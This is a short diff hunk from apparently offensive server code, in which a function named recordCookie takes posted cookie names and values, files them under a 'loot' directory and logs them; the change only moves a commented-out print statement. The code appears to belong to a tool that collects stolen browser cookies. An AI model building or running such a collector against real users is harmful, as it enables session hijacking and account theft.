@@ -918,9 +918,9 @@ def recordCookie(identifier):
 
     lootDir = findLootDirectory(identifier)
     content = request.json
-    # print("**** New cookie report: " + content)
     cookieName = content['cookieName']
     cookieValue = content['cookieValue']
+    # print("Cookie name: " + content['cookieName'] + ", value: " + content['cookieValue'])
     logEvent(identifier, "Cookie Name: " + cookieName + ", value: " + cookieValue)
 
 
